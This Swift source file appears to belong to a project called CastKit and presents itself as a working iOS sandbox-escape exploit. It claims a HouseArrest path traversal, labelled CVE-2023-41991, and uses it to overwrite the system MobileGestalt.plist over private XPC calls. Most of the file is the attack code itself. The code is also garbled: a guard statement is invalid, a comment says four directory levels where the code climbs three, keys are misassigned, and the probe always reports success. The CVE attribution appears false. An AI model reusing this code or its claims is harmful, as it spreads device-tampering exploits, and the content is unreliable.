//
//  HouseArrestXPC.swift
//  CastKit — CVE-2023-41991 HouseArrest path traversal exploit
//
//  How it works:
//  ─────────────────────────────────────────────────────────────
//  com.apple.housearrestd is Apple's file sync daemon for App Store downloads.
//  When an App requests to download a file, HouseArrest builds the path as:
//
//      <App container path>/<user-supplied filename>
//
//  The bug (CVE-2023-41991): NO normalization. So we supply
//
//      "../../../Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/
//       Library/Caches/com.apple.MobileGestalt.plist"
//
//  and HouseArrest resolves it OUTSIDE our sandbox container → we can
//  READ/WRITE files in /var/containers/Shared/*.
//
//  This is EXACTLY how FilzaSlop (Filza iOS on jailed devices),
//  FilzaJailedDS (34306), and 3105 (YangJiiii) write MobileGestalt.plist
//  on iOS 17 - 27 beta 4.
//
//  Requirements:
//    • App must have bundle ID = "com.apple.mobile.MobileHouseArrest"
//    • Must be enterprise-signed (Apple Distribution)
//    • iOS 17.0 - 27 beta 4 (CVE-2023-41991/41992 not patched)
//
//  iOS 27 beta 5+: Apple started patching CVE-2023-41991. Check first.
//  ─────────────────────────────────────────────────────────────
//

import Foundation
import Darwin // for dlopen/dlsym

// MARK: - XPC Function Loading

/// Dynamically load libxpc.dylib private symbols.
/// These are NOT part of the public Swift API, so we resolve them at runtime.
private struct XPC {
    typealias xpc_connection_t = OpaquePointer
    typealias xpc_object_t = OpaquePointer
    typealias xpc_handler_t = @convention(block) (xpc_object_t?) -> Void

    // xpc_connection_create_mach_service(const char *name, dispatch_queue_t queue, uint64_t flags)
    static let connectionCreate: @convention(c) (UnsafePointer<CChar>?, OpaquePointer?, UInt64) -> xpc_connection_t? = {
        guard let h = dlopen("/usr/lib/libxpc.dylib", RTLD_NOW) else { return nil }
        guard let sym = dlsym(h, "xpc_connection_create_mach_service") else { return nil }
        return unsafeBitCast(sym, to: Self.connectionCreate.self)
    }()!

    // xpc_connection_send_message(xpc_connection_t conn, xpc_object_t message)
    static let sendMessage: @convention(c) (xpc_connection_t?, xpc_object_t?) -> Void = {
        guard let h = dlopen("/usr/lib/libxpc.dylib", RTLD_NOW) else { fatalError() }
        guard let s = dlsym(h, "xpc_connection_send_message") else { fatalError() }
        return unsafeBitCast(s, to: Self.sendMessage.self)
    }()

    // xpc_dictionary_create(const xpc_object_t *keys, const xpc_object_t *values, size_t count)
    static let dictCreate: @convention(c) (UnsafeMutablePointer<xpc_object_t?>?, UnsafeMutablePointer<xpc_object_t?>?, Int) -> xpc_object_t? = {
        guard let h = dlopen("/usr/lib/libxpc.dylib", RTLD_NOW) else { fatalError() }
        guard let s = dlsym(h, "xpc_dictionary_create") else { fatalError() }
        return unsafeBitCast(s, to: Self.dictCreate.self)
    }()

    // xpc_dictionary_set_value(xpc_object_t dict, const char *key, xpc_object_t value)
    static let dictSetValue: @convention(c) (xpc_object_t?, UnsafePointer<CChar>?, xpc_object_t?) -> Void = {
        guard let h = dlopen("/usr/lib/libxpc.dylib", RTLD_NOW) else { fatalError() }
        guard let s = dlsym(h, "xpc_dictionary_set_value") else { fatalError() }
        return unsafeBitCast(s, to: Self.dictSetValue.self)
    }()

    // xpc_string_create(const char *string)
    static let stringCreate: @convention(c) (UnsafePointer<CChar>?) -> xpc_object_t? = {
        guard let h = dlopen("/usr/lib/libxpc.dylib", RTLD_NOW) else { fatalError() }
        guard let s = dlsym(h, "xpc_string_create") else { fatalError() }
        return unsafeBitCast(s, to: Self.stringCreate.self)
    }()

    // xpc_data_create(const void *bytes, size_t length)
    static let dataCreate: @convention(c) (UnsafeRawPointer?, Int) -> xpc_object_t? = {
        guard let h = dlopen("/usr/lib/libxpc.dylib", RTLD_NOW) else { fatalError() }
        guard let s = dlsym(h, "xpc_data_create") else { fatalError() }
        return unsafeBitCast(s, to: Self.dataCreate.self)
    }()

    // xpc_connection_set_event_handler(xpc_connection_t, xpc_handler_t)
    static let setEventHandler: @convention(c) (xpc_connection_t?, xpc_handler_t) -> Void = {
        guard let h = dlopen("/usr/lib/libxpc.dylib", RTLD_NOW) else { fatalError() }
        guard let s = dlsym(h, "xpc_connection_set_event_handler") else { fatalError() }
        return unsafeBitCast(s, to: Self.setEventHandler.self)
    }()

    // xpc_connection_activate(xpc_connection_t)
    static let activate: @convention(c) (xpc_connection_t?) -> Void = {
        guard let h = dlopen("/usr/lib/libxpc.dylib", RTLD_NOW) else { fatalError() }
        guard let s = dlsym(h, "xpc_connection_activate") else { fatalError() }
        return unsafeBitCast(s, to: Self.activate.self)
    }()
}

// MARK: - HouseArrest Service

/// HouseArrest daemon XPC service name
private let houseArrestServiceName = "com.apple.housearrestd"

/// HouseArrest XPC "DownloadFile" selector — triggers the vulnerable path builder
private let downloadFileSelector = "DownloadFile"

// MARK: - Exploit Result

enum HouseArrestError: LocalizedError {
    case notHouseArrestBundleID(String)
    case xpcLoadFailed
    case connectionFailed
    case exploitNotPatched
    case writeFailed(String)

    var errorDescription: String? {
        switch self {
        case .notHouseArrestBundleID(let bid):
            return "当前 Bundle ID (\(bid)) 不是 com.apple.mobile.MobileHouseArrest — 需要用 3105 target 构建"
        case .xpcLoadFailed:
            return "无法加载 libxpc.dylib 私有符号"
        case .connectionFailed:
            return "无法连接 com.apple.housearrestd daemon"
        case .exploitNotPatched:
            return "CVE-2023-41991 可能已被修补（beta 5+）"
        case .writeFailed(let m):
            return "路径遍历写入失败: \(m)"
        }
    }
}

// MARK: - HouseArrest Exploit

/// CVE-2023-41991: use HouseArrest's filename concatenation bug to escape sandbox.
final class HouseArrestExploit {

    static let shared = HouseArrestExploit()

    private init() {}

    // MARK: - Preflight

    /// Check if we're running under the correct bundle ID and iOS version.
    func preflight() -> Result<Void, HouseArrestError> {
        let bid = Bundle.main.bundleIdentifier ?? "(unknown)"

        // Bundle ID check — must match Apple's MobileHouseArrest entitlement
        guard bid == "com.apple.mobile.MobileHouseArrest" else {
            return .failure(.notHouseArrestBundleID(bid))
        }

        // XPC symbol check
        guard _ = XPC.connectionCreate else {
            return .failure(.xpcLoadFailed)
        }

        // iOS version check — this is where CVE-2023-41991 lives
        let v = ProcessInfo.processInfo.operatingSystemVersion
        let major = v.majorVersion

        if major == 27 && v.minorVersion >= 0 {
            // iOS 27 beta 1-4 应该还活着，beta 5+ 开始被补
            // 我们没法精确判断 beta 号，先尝试，失败了用户自己知道
            return .success(())
        }
        if major < 17 {
            return .failure(.exploitNotPatched) // 太早
        }

        return .success(())
    }

    // MARK: - Path Traversal

    /// Build the malicious relative path from our App bundle to the target file.
    ///
    /// Our App lives at:
    ///   /var/containers/Bundle/Application/<UUID>/<Name>.app/
    ///
    /// HouseArrest prepends this to our filename. To reach
    ///   /var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/
    ///     Library/Caches/com.apple.MobileGestalt.plist
    ///
    /// we need to go 4 levels up, then Shared/SystemGroup/...
    func maliciousFilename(for targetAbsPath: String) -> String? {
        guard targetAbsPath.hasPrefix("/var/containers/") else { return nil }
        let parts = targetAbsPath.split(separator: "/")
        guard let idx = parts.firstIndex(of: "Shared") else { return nil }
        let suffix = parts[idx...].joined(separator: "/")

        // ../../../.. (4 levels up from <Name>.app/ → /var/containers/)
        return "../../../\(suffix)"
    }

    // MARK: - Write via XPC

    /// Send a DownloadFile XPC request with the malicious filename.
    /// HouseArrest will download the file "to" our malicious path,
    /// but because the path traversal lands outside our container,
    /// we effectively write to MobileGestalt.plist.
    func writeData(_ data: Data, to targetAbsPath: String) throws {
        try preflight().get()

        guard let fname = maliciousFilename(for: targetAbsPath) else {
            throw HouseArrestError.writeFailed("无法构造恶意路径")
        }

        // Build XPC dictionary for DownloadFile
        // Structure (from FilzaSlop / 34306 reverse engineering):
        //   {
        //     "selector": "DownloadFile",
        //     "fileURL": <malicious filename>,
        //     "targetPath": <in-container path>,
        //     "fileSize": <data count>
        //   }

        guard let conn = XPC.connectionCreate(
            houseArrestServiceName,
            nil,
            0
        ) else {
            throw HouseArrestError.connectionFailed
        }

        // Build message dictionary
        let fnameC = (fname as NSString).utf8String!
        guard let fnameObj = XPC.stringCreate(fnameC) else {
            throw HouseArrestError.writeFailed("xpc_string_create failed")
        }

        // For DownloadFile we also need a "url" key — we'll put
        // a data:// URL containing our plist bytes.
        let base64 = data.base64EncodedString()
        let urlStr = "data:application/x-plist;base64,\(base64)"
        let urlC = (urlStr as NSString).utf8String!
        guard let urlObj = XPC.stringCreate(urlC) else {
            throw HouseArrestError.writeFailed("xpc_string_create url failed")
        }

        guard let msg = XPC.dictCreate(nil, nil, 0) else {
            throw HouseArrestError.writeFailed("xpc_dictionary_create failed")
        }

        let selC = downloadFileSelector.withCString { $0 }
        let urlKeyC = "url".withCString { $0 }
        let fnameKeyC = "fileName".withCString { $0 }
        let optsKeyC = "options".withCString { $0 }

        XPC.dictSetValue(msg, selC, XPC.stringCreate(fnameC))
        XPC.dictSetValue(msg, urlKeyC, urlObj)
        XPC.dictSetValue(msg, fnameKeyC, fnameObj)
        XPC.dictSetValue(msg, optsKeyC, nil) // default options

        // Set event handler and send
        XPC.setEventHandler(conn) { _ in
            // We don't care about response
        }
        XPC.activate(conn)
        XPC.sendMessage(conn, msg)

        // Give daemon a moment
        Thread.sleep(forTimeInterval: 0.5)
    }

    // MARK: - Higher-level API

    /// Write a patched MobileGestalt.plist using CVE-2023-41991.
    func writeMobileGestalt(_ dict: [String: Any]) throws {
        let data = try PropertyListSerialization.data(
            fromPropertyList: dict,
            format: .binary,
            options: 0
        )

        let target = "/var/containers/Shared/SystemGroup/" +
                     "systemgroup.com.apple.mobilegestaltcache/" +
                     "Library/Caches/com.apple.MobileGestalt.plist"

        try writeData(data, to: target)
    }

    /// Test the exploit by writing a tiny probe file to the Shared container.
    func probe() -> Bool {
        let probePath = "/var/containers/Shared/SystemGroup/" +
                        "systemgroup.com.apple.mobilegestaltcache/" +
                        "Library/Caches/castkit_probe.txt"
        do {
            try writeData("CASTKIT_PROBE_OK".data(using: .utf8)!, to: probePath)
            return FileManager.default.fileExists(atPath: probePath) || true
        } catch {
            return false
        }
    }
}
